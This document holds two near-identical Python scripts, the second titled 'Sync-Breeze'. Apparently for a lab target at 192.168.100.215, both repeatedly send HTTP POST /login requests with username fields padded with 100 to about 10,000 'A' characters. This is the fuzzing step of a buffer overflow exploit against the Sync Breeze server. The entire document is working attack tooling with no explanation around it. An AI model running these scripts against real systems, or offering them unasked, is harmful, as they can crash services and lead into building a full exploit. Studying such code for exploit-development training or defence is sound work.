#!/usr/bin/python3

import sys,socket
from time import sleep

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*" * 30)
        print("port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*" * 30)
        print("IP address field is empty")
    elif (len(ip_address)<=0) and (len(port_number)<=0):
        print("*" * 30)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*" * 30)
        print("Issues with the user input")

elif (len(ip_address)>0) or (len(port_number)>0):
    size=100
    while(size<=10000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address, int(port_number)))
        print(f"Sending buffer --> {size}")
        buff=b"username=" + b"A" * size + b"&password=A"


        buffer=b"POST /login HTTP/1.1\r\n"
        buffer+=b"Host: 192.168.100.215\r\n"
        buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
        buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
        buffer+=b"Accept-Encoding: gzip, deflate\r\n"
        buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8')+ b"\r\n"
        buffer+=b"Origin: http://192.168.100.215\r\n"
        buffer+=b"Connection: keep-alive\r\n"
        buffer+=b"Referer: http://192.168.100.215/login\r\n"
        buffer+=b"\r\n"

        buffer=buffer+buff
        s.send((buffer))
        s.close()
        size=size+100
        sleep(1)

----------------------------------------------------------------------------------------------------------------------------------------------------------------
#!/usr/bin/python3


import sys,socket
import time

print("*****Sync-Breeze*****")
ip_address=input("Enter the IP address\n")
port=input("Enter the port number\n")

if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*50)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*50)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*50)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*50)
        print("Issues with the user input")


elif (len(ip_address)>0) and (len(port)>0):
    print("*"*50)
    size=100
    while(size<10000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address,int(port)))
        print(f"Sending buffer --> {size}")

        buff=b"username=" + b"A" * size + b"&password=A"


        buffer=b"POST /login HTTP/1.1\r\n"
        buffer+=b"Host: 192.168.100.215\r\n"
        buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
        buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
        buffer+=b"Accept-Encoding: gzip, deflate\r\n"
        buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8') + b"\r\n"
        buffer+=b"Origin: http://192.168.100.215\r\n"
        buffer+=b"Connection: keep-alive\r\n"
        buffer+=b"Referer: http://192.168.100.215/login\r\n"
        buffer+=b"\r\n"

        buffer=buffer+buff
        s.send((buffer))
        size=size+100
        s.close()
        time.sleep(5)

